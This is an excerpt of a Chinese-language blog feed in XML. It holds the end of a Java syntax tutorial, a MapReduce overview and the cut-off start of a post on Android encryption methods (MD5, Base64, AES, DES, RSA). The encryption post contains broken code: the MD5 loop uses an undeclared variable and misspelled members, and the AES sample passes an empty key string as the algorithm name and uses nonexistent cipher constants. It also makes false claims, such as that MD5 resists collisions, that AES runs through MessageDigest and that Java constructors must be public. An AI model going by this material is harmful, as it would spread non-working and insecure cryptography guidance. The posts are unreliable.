java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">System.out.println(<span class="string">"3 == 2? "</span> + (<span class="number">3</span> == <span class="number">2</span>)); <span class="comment">// =&gt; false</span></span><br><span class="line">System.out.println(<span class="string">"3 != 2? "</span> + (<span class="number">3</span> != <span class="number">2</span>)); <span class="comment">// =&gt; true</span></span><br><span class="line">System.out.println(<span class="string">"3 &gt; 2? "</span> + (<span class="number">3</span> &gt; <span class="number">2</span>)); <span class="comment">// =&gt; true</span></span><br><span class="line">System.out.println(<span class="string">"3 &lt; 2? "</span> + (<span class="number">3</span> &lt; <span class="number">2</span>)); <span class="comment">// =&gt; false</span></span><br><span class="line">System.out.println(<span class="string">"2 &lt;= 2? "</span> + (<span class="number">2</span> &lt;= <span class="number">2</span>)); <span class="comment">// =&gt; true</span></span><br><span class="line">System.out.println(<span class="string">"2 &gt;= 2? "</span> + (<span class="number">2</span> &gt;= <span class="number">2</span>)); <span class="comment">// =&gt; true</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="位运算操作符">位运算操作符</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">~       取反，求反码</span></span><br><span class="line"><span class="comment">&lt;&lt;      带符号左移</span></span><br><span class="line"><span class="comment">&gt;&gt;      带符号右移</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt;     无符号右移</span></span><br><span class="line"><span class="comment">&amp;       和</span></span><br><span class="line"><span class="comment">^       异或</span></span><br><span class="line"><span class="comment">|       相容或</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="自增">自增</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">System.out.println(<span class="string">"\n-&gt;Inc/Dec-rementation"</span>);</span><br><span class="line"><span class="comment">// ++ 和 -- 操作符使变量加或减1。放在变量前面或者后面的区别是整个表达式的返回值。操作符在前面时，先加减，后取值。操作符在后面时，先取值后加减。</span></span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">System.out.println(i++); <span class="comment">// 后自增 i = 1, 输出0</span></span><br><span class="line">System.out.println(++i); <span class="comment">// 前自增 i = 2, 输出2</span></span><br><span class="line">System.out.println(i--); <span class="comment">// 后自减 i = 1, 输出2</span></span><br><span class="line">System.out.println(--i); <span class="comment">// 前自减 i = 0, 输出0</span></span><br></pre>      </td>    </tr>  </table></figure><h1>控制结构</h1><h2 id="if语句和c的类似">If语句和C的类似</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">int</span> j = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (j == <span class="number">10</span>)&#123;</span><br><span class="line">    System.out.println(<span class="string">"I get printed"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (j &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">"I don't"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">"I also don't"</span>);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="while循环">While循环</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">int</span> fooWhile = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(fooWhile &lt; <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//System.out.println(fooWhile);</span></span><br><span class="line">    <span class="comment">//增加计数器</span></span><br><span class="line">    <span class="comment">//遍历99次， fooWhile 0-&gt;99</span></span><br><span class="line">    fooWhile++;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"fooWhile Value: "</span> + fooWhile);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="do-while循环">Do While循环</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">int</span> fooDoWhile = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//System.out.println(fooDoWhile);</span></span><br><span class="line">    <span class="comment">//增加计数器</span></span><br><span class="line">    <span class="comment">//遍历99次, fooDoWhile 0-&gt;99</span></span><br><span class="line">    fooDoWhile++;</span><br><span class="line">&#125;<span class="keyword">while</span>(fooDoWhile &lt; <span class="number">100</span>);</span><br><span class="line">System.out.println(<span class="string">"fooDoWhile Value: "</span> + fooDoWhile);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="for-循环">For 循环</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">int</span> fooFor;</span><br><span class="line"><span class="comment">//for 循环结构 =&gt; for(&lt;起始语句&gt;; &lt;循环进行的条件&gt;; &lt;步长&gt;)</span></span><br><span class="line"><span class="keyword">for</span>(fooFor=<span class="number">0</span>; fooFor&lt;<span class="number">10</span>; fooFor++)&#123;</span><br><span class="line">    <span class="comment">//System.out.println(fooFor);</span></span><br><span class="line">    <span class="comment">//遍历 10 次, fooFor 0-&gt;9</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"fooFor Value: "</span> + fooFor);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="switch-case-语句">Switch Case 语句</h2><p>switch可以用来处理 byte, short, char, 和 int 数据类型，也可以用来处理枚举类型,字符串类,和原始数据类型的包装类：Character, Byte, Short, 和 Integer</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">int</span> month = <span class="number">3</span>;</span><br><span class="line">String monthString;</span><br><span class="line"><span class="keyword">switch</span> (month)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            monthString = <span class="string">"January"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            monthString = <span class="string">"February"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            monthString = <span class="string">"March"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">            monthString = <span class="string">"Some other month"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"Switch Case Result: "</span> + monthString);</span><br></pre>      </td>    </tr>  </table></figure><h1>类型转换</h1><h2 id="数据转换">数据转换</h2><p>将字符串转换为整型</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Integer.parseInt(&quot;123&quot;);//返回整数123</span><br></pre>      </td>    </tr>  </table></figure><p>将整型转换为字符串</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Integer.toString(123);//返回字符串&quot;123&quot;</span><br></pre>      </td>    </tr>  </table></figure><p>其他的数据也可以进行互相转换:</p><ul>  <li>Double</li>  <li>Long</li>  <li>String</li></ul><h2 id="类型转换">类型转换</h2><p>你也可以对java对象进行类型转换, 但其中会牵扯到很多概念在这里可以查看更详细的信息: <a href="http://docs.oracle.com/javase/tutorial/java/IandI/subclasses.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/tutorial/java/IandI/subclasses.html</a></p><h1>方法</h1><h2 id="用new来实例化一个类">用new来实例化一个类</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Bicycle trek = new Bicycle();</span><br></pre>      </td>    </tr>  </table></figure><h2 id="调用对象的方法">调用对象的方法</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">trek.speedUp(3); // 需用getter和setter方法</span><br><span class="line">trek.setCadence(100);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="tostring-可以把对象转换为字符串">toString 可以把对象转换为字符串</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">System.out.println(&quot;trek info: &quot; + trek.toString());</span><br></pre>      </td>    </tr>  </table></figure><p><strong>你也可以把其他的非public类放入到.java文件中！！</strong></p><h2 id="类定义的语法">类定义的语法</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;<span class="keyword">public</span>/<span class="keyword">private</span>/<span class="keyword">protected</span>&gt; <span class="class"><span class="keyword">class</span> &lt;类名&gt;</span>&#123;</span><br><span class="line">  <span class="comment">//成员变量, 构造函数, 函数</span></span><br><span class="line">  <span class="comment">//Java中函数被称作方法</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="构造方法">构造方法</h2><p>构造方法不写返回值，返回类型，必须是<code>public</code>。</p><p>以下是一个默认构造函数</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Bicycle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    gear = <span class="number">1</span>;</span><br><span class="line">    cadence = <span class="number">50</span>;</span><br><span class="line">    speed = <span class="number">5</span>;</span><br><span class="line">    name = <span class="string">"Bontrager"</span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>以下是一个含有参数的构造函数</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Bicycle</span><span class="params">(<span class="keyword">int</span> startCadence, <span class="keyword">int</span> startSpeed, <span class="keyword">int</span> startGear, String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.gear = startGear;</span><br><span class="line">    <span class="keyword">this</span>.cadence = startCadence;</span><br><span class="line">    <span class="keyword">this</span>.speed = startSpeed;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="方法书写语法">方法书写语法</h2><p>&lt;public/private/protected&gt; &lt;返回值类型&gt; &lt;函数名称&gt;(&lt;参数列表&gt;)</p><p>Java类中经常会用getter和setter来对成员变量进行操作。</p><h2 id="类的继承">类的继承</h2><p>PennyFarthing 是 Bicycle 的子类</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PennyFarthing</span> <span class="keyword">extends</span> <span class="title">Bicycle</span> </span>&#123;</span><br></pre>      </td>    </tr>  </table></figure><p>通过<code>super</code>调用父类的构造函数</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PennyFarthing</span><span class="params">(<span class="keyword">int</span> startCadence, <span class="keyword">int</span> startSpeed)</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(startCadence, startSpeed, <span class="number">0</span>, <span class="string">"PennyFarthing"</span>);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>你可以用<code>@注释</code>来表示需要重载的方法</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setGear</span><span class="params">(<span class="keyword">int</span> gear)</span> </span>&#123;</span><br><span class="line">        gear = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/50525a4c/">http://home.meng.uno/articles/50525a4c/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      注释
每种语言，第一个教我们的都是“注释”。Java基本有如下三种注释。

1


// 单行注释


1
2
3


/*
多行注释
*/


1
2
3


/**
JavaDoc（Java文档）注释是这样的。可以用来描述类和类的属性。
*/


文件头
包
包就像定义文件路径一样，实际上的存储也是按包的名称存储。

1


package uno.meng;


导入类
导入一个类：

1


import java.util.ArrayList;


导入所有类：

1


import java.security.*;


书写类
每个 .java 文件都包含一个public类，这个
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="Language" scheme="http://home.meng.uno/tags/Language/"/>
    
  </entry>
  
  <entry>
    <title>Map Reduce</title>
    <link href="http://home.meng.uno/articles/25d9ef10/"/>
    <id>http://home.meng.uno/articles/25d9ef10/</id>
    <published>2017-03-01T06:36:02.000Z</published>
    <updated>2020-12-02T01:43:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1>Map Reduce 的意义</h1><h2 id="集群">集群</h2><p>在传统的单节点模型中，CPU从内存读取数据，当内存空间不够时，再从磁盘读取数据，当磁盘空间不够了呢？</p><p>即使磁盘空间足够，磁盘带宽是50MB/sec，若从磁盘读取200TB数据，大约需要46+天，完全没法接受呀！</p><p>需要这样一个集群……</p><p><img src="http://www.meng.uno/images/map/1.png" alt="IMG"></p><h2 id="优点-解决困难">优点（解决困难）</h2><h3 id="节点故障-node-failures">节点故障（node failures）</h3><p>如果单个服务器能坚持3年（1000天），1000台服务器的集群平均每天大概发生1次故障，1M台服务器的集群平均每天大概发生1000次故障。节点故障时亟须解决的问题：</p><ul>  <li>如何存储数据，即使节点故障时仍可用？</li>  <li>若正在进行大规模计算，如果节点发生故障该如何处理？</li></ul><p>Map Reduce在多个节点冗余存储，保证数据持久存储和获取。</p><h3 id="网络瓶颈-network-bottleneck">网络瓶颈（network bottleneck）</h3><p>Map Reduce的计算靠近数据端，减少数据移动。</p><h3 id="分布式程序编写困难">分布式程序编写困难</h3><p>Map Reduce简单的编程模型，隐藏了复杂的细节。</p><h1>Map Reduce 简介</h1><h2 id="冗余存储架构">冗余存储架构</h2><p>冗余存储架构采用分布式文件系统（distributed file system），例如：Google GFS、Hadoop HDFS。典型的应用是处理大文件，一次存储多次读取追加更新。</p><p><img src="http://www.meng.uno/images/map/2.png" alt="IMG"></p><p>数据分块（chuck）存储在多台服务器。如上图所示，一个大文件分割成C0～C5共6块，每块在多台服务器存储备份。每台存储服务器也做计算用，使得计算靠近存储端。</p><h2 id="计算模型">计算模型</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line">输入：key-value对的集合 </span><br><span class="line"></span><br><span class="line">- Map(k,v) —&gt; &lt;k’, v’&gt;*</span><br><span class="line">  - 输入一个key-value对，输出多个key-value对；</span><br><span class="line">  - 对所有的(k,v)对，只有一个Map函数。</span><br><span class="line"></span><br><span class="line">- Reduce(k’, &lt;v’&gt;*) —&gt; &lt;k’, v”&gt;</span><br><span class="line">  - 所有的具有相同k’的v’都被reduce到一起；</span><br><span class="line">  - 对同一个k’，只有一个Reduce函数。</span><br></pre>      </td>    </tr>  </table></figure><p>Map-Reduce的计算模型分为Map和Reduce两步，Map分布式处理任务，Reduce合并任务。</p><p><img src="http://www.meng.uno/images/map/3.png" alt="IMG"></p><p>上图展示了用Map-Reduce统计超大规模文件中单词出现次数，红色横线将不同节点的实现分割开。对于Map节点，所有相同单词都输出到同一个节点，比如the都在第二个节点。为了保证效率，Map-Reduce都采用的是顺序读取。</p><h2 id="调度与数据流">调度与数据流</h2><p><img src="http://www.meng.uno/images/map/4.png" alt="IMG"></p><p>Map-Reduce的数据流：</p><ul>  <li>输入输出存储在分布式文件系统；</li>  <li>中间结果存储在本地文件系统；</li>  <li>输出通常再输入到另一个Map-Reduce任务。</li></ul><p><img src="http://www.meng.uno/images/map/5.png" alt="IMG"></p><p>上图是Map-Reduce分布式系统的并行实现，Partition Function部分采用Hash算法，将相同key的value映射到同一节点。</p><p>Map-Reduce环境的主要任务：</p><ul>  <li>分割输入数据；</li>  <li>多机之间程序调度；</li>  <li>执行按key分组操作；</li>  <li>处理节点故障；</li>  <li>处理多机间通信。</li></ul><p>Map Reduce的实现分为Master节点、Map节点和Reduce节点，Master节点的任务：</p><ul>  <li>管理每个任务状态：空闲（idle，等待处理）、处理中（in-progress）、completed（结束）；</li>  <li>将空闲任务安排到可用节点；</li>  <li>当Map任务结束，向Master发送其R中间文件（存放在本地文件系统中）的位置和大小，每个reducer一个中间文件；</li>  <li>Master推送信息到Reducer；</li>  <li>Master周期性ping检测节点是否出故障。</li></ul><p>Map Reduce系统有M个Map任务和R个Reduce任务，M比集群中的节点数目大得多，R通常比M小。</p><h1>Map Reduce 的改进</h1><h2 id="合并操作">合并操作</h2><p><img src="http://www.meng.uno/images/map/6.png" alt="IMG"></p><p>通常在一个Map任务中会产生多个相同key的(k,v)对，在Map节点合并这些相同的key可有效降低网络流量，如上图所示。合并函数通常与Reduce函数相同。</p><p>合并时需要注意Reduce函数是否支持在Map节点的合并操作，也就是合并操作会不会改变Reduce的结果。</p><h2 id="改写分割函数">改写分割函数</h2><p>例如：系统采用的默认分割函数hash(key) mod R可以改写为hash(hostname(URL)) mod R，使同一个主机的url输出到相同的文件。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/25d9ef10/">http://home.meng.uno/articles/25d9ef10/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Map Reduce 的意义
集群
在传统的单节点模型中，CPU从内存读取数据，当内存空间不够时，再从磁盘读取数据，当磁盘空间不够了呢？

即使磁盘空间足够，磁盘带宽是50MB/sec，若从磁盘读取200TB数据，大约需要46+天，完全没法接受呀！

需要这样一个集群……



优点（解决困难）
节点故障（node failures）
如果单个服务器能坚持3年（1000天），1000台服务器的集群平均每天大概发生1次故障，1M台服务器的集群平均每天大概发生1000次故障。节点故障时亟须解决的问题：

 * 如何存储数据，即使节点故障时仍可用？
 * 若正在进行大规模计算，如果节点发生故障该如何
    
    </summary>
    
      <category term="Data Mining" scheme="http://home.meng.uno/categories/Data-Mining/"/>
    
    
      <category term="Map" scheme="http://home.meng.uno/tags/Map/"/>
    
      <category term="Reduce" scheme="http://home.meng.uno/tags/Reduce/"/>
    
      <category term="集群" scheme="http://home.meng.uno/tags/%E9%9B%86%E7%BE%A4/"/>
    
      <category term="分布式" scheme="http://home.meng.uno/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Android数据加密相关</title>
    <link href="http://home.meng.uno/articles/7f8aa6cf/"/>
    <id>http://home.meng.uno/articles/7f8aa6cf/</id>
    <published>2017-02-28T10:18:39.000Z</published>
    <updated>2020-12-02T01:45:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>Android开发中常见的几种加密方式</p><ul>  <li>MD5</li>  <li>BASE64</li>  <li>AES</li>  <li>DES</li>  <li>RSA</li>  <li>SSL/TSL</li></ul><h1>MD5加密</h1><p>MD5英文全称<code>Message-Digest Algorithm 5</code>,全称消息算法摘要,是一种不可逆加密方式</p><h2 id="特点">特点</h2><ul>  <li>压缩性：任意长度的数据，算出的MD5值长度都是固定的。</li>  <li>容易计算：从原数据计算出MD5值很容易。</li>  <li>抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。</li>  <li>强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。</li></ul><p>因为其特点,MD5加密通常用来验证文件的完整性,防串改.</p><h2 id="实现">实现</h2><p>在Java中提供了MessageDigest类来加密数据.</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">byte</span>[] resource; <span class="comment">//需要加密的数据</span></span><br><span class="line">MessageDigest md5=MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line"><span class="keyword">byte</span>[] bytes=md5.digest(resource);</span><br><span class="line">StringBuilder builder=<span class="keyword">new</span> StringBuilder(bytes.lenght);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">byte</span> <span class="keyword">byte</span> :bytes ) &#123;</span><br><span class="line"> String temp = Integer.toHexString(b &amp; <span class="number">0xff</span>);</span><br><span class="line"> <span class="keyword">if</span> (temp.lenght==<span class="number">1</span>) &#123;</span><br><span class="line">     builder.append(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    builder.append(temp);</span><br><span class="line">&#125;</span><br><span class="line">String MD5=builder.toString();</span><br></pre>      </td>    </tr>  </table></figure><p>MD5加密是对字节数组进行操作的.所以无论加密文件或是其它都需要先转换为字节数组.加密后的结果也是字节数组. 为了方便查看,需要按规定转换为字节数组.</p><h1>BASE64</h1><p>BASE64并不是一种加密方式,而是对字节数组的一种编码方式.实际上是让字节数据转换为文本的方案.</p><h2 id="原理">原理</h2><p>BASE64是把字节数据转换为ASC码中对应的64个字符(英文大小写,+及/). 转换方式为每6位字节对应一个字符.不足位的后面补0.6位字节转换为十进制数值.范围是0-63,对应64个字符.如果有不足位的,在编码后会补上数量对应的=</p><h2 id="用处">用处</h2><ul>  <li>统一编码方式,不需要考虑字符集对数据的影响</li>  <li>可以把任何文件或数据都以纺一的文本方式保存</li></ul><h2 id="实现-v2">实现</h2><p>在Java中提供了Base64类来实现编码转换</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">//编码</span></span><br><span class="line">String encode= Base64.encode(<span class="keyword">byte</span>[] bytes,<span class="keyword">int</span> flag);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line"><span class="keyword">byte</span>[] decode=Base64.decode(<span class="keyword">byte</span>[] bytes,<span class="keyword">int</span> flag);</span><br></pre>      </td>    </tr>  </table></figure><p>flag表示编码方式,通常使用<code>Base64.DEFAULT</code></p><ul>  <li><code>Base64.DEFAULT</code> 默认的编码方式</li>  <li><code>Base64.NO_PADDING</code> 忽略后缀的=号</li>  <li><code>Base64.NO_WRAP</code> 省略换行符</li>  <li><code>Base64.CTRL</code> 使用微软的换行符,而不是Liunux的</li>  <li><code>Base64.URL_SAFE</code> 使用<code>-和_</code>代替<code>+和/</code>以保证在URL的安全.通常用与网络传输</li></ul><h1>AES</h1><p><code>Advanced Encryption Standard</code>,全称为高级加密标准,又称为 <strong>Rijndael</strong> 加密法,使用的是区块加密方案。</p><p>区块加密方案是把一定数量的字节划分为一个区块,把区块内的数据加密成相同位数的数据。</p><p>AES是一种对称加密方案,所以需要加密端和解密端都使用相同的密钥.</p><h2 id="特点-v2">特点</h2><ul>  <li>区块 AES是对字节数组按区块划分,对区块进行加密.AES区块大小固定为128位.</li>  <li>密钥 AES的密钥长度有三种,128位/192位/256位 位数越多安全性越高.</li>  <li>矩阵 AES每次对区块中的16个字节进行操作,这4个字节会组成一个4x4的矩阵.</li>  <li>回合密钥 AES对每个矩阵的操作时都会根据密钥生成一个16位的回合密钥.对应矩阵上的每一个字节</li></ul><h2 id="实现-v3">实现</h2><p>在Java中通过MessageDigest来进行AES加解密</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">//密钥原数据字符串,两端必须一样,128位的密钥字符串长度必须为16</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY=<span class="string">""</span></span><br><span class="line"><span class="comment">//加密方式,AES表示AES加密,CBC表示区块的处理方式,PKC5Padding表示区块的填充方式.</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MODE=<span class="string">"AES/CBC/PKCS5Padding"</span></span><br><span class="line"><span class="comment">//生成密钥</span></span><br><span class="line">KeyGenerator keyGenerator = KeyGenerator.getInstance(KEY);</span><br><span class="line">SecretKey secretKey = keyGenerator.generateKey();</span><br><span class="line"><span class="comment">//初始化密码处理类</span></span><br><span class="line">Cipher cipher = Cipher.getInstance(MODE);</span><br><span class="line">cipher.init(Cipher.ENCRIPT_MODE,secretKey);  <span class="comment">//第一个参数为模式,ENCRIPT_MODE为加密, DECRIPT为解密</span></span><br><span class="line"><span class="comment">//cipher.init(Cipher.DECRIPT_MODE,secretKey,"BC");  使用`PKCS7Padding`方式时需要加载bouncycastle包,BC为提供该填充方式的Provicer</span></span><br><span class="line"><span class="keyword">byte</span>[] date=cipher.doFinal(<span class="keyword">byte</span>[] data); <span class="comment">//加密和解密都是同一个方法,由初始化的模式决定.对源字节数组进行处理.生成新的字节数组.</span></span><br></pre>      </td>    </tr>  </table></figure><p>填充方式有几种.Java6没有实现所有的填充方式.</p><ul>  <li><code>NoPadding,PKCS5Padding,ISO10126Padding</code> Java6实现</li>  <li><code>PKCS7Padding,ZeroBytePadding</code> 需要加载<code>bouncycastle</code>包</li></ul><p>生成密钥时,<code>getInstance()</code>有个重载的方法可以添加一个provier.为密钥添加一个随机数。</p><p>AES加密安全性高,速度快。</p><h1>DES</h1><p><code>Data Encryption Standard</code>,标准加密算法.使用64位密钥的对称加密.使用的也是区块加密方案. 因为是64位密钥,安全性不高,现已经被AES加密替代. 实现方法同AES加密,只需要把MODE中的  <code>AES</code>改为<code>DES</code></p><h1>RSA</h1><p>目前使用最广泛的非对称加密.生成一对密钥–公钥和私钥.公钥对来对外提供.私钥只有密钥生成者自己拥有。</p><p>非对称算法需要指定密钥长度,越长安全性越好,但加解密的速度就越慢.通常指定1024或2048。</p><p>一次加密的的密文长度为密钥长度/8-11,所以1024长度的密钥一次只能加密117字节.2048能加密245字节。</p><p>所以非对称加密通常只用与短数据加密,如签名或对称加密的密钥。</p><p>RSA加密都是一用与一对多的场景。</p><p>RSA有两种使用方式：</p><ul>  <li>加密算法 公钥加密,只有私钥才能解密  </li>  <li>签名算法 私钥签名,只有公钥才能验证. 如Github使用的SSH登录就是使用的RSA加密算法.用户把公钥保存到服务器,通过SSH登录时服务器发一个随机数给客户端,客户端使用私钥加密发送到服务器,服务器用保存的公钥解密。  </li></ul><h2 id="rsa的密钥的产生">RSA的密钥的产生</h2><ul>  <li>随机获取两个大质数,得其积N</li>  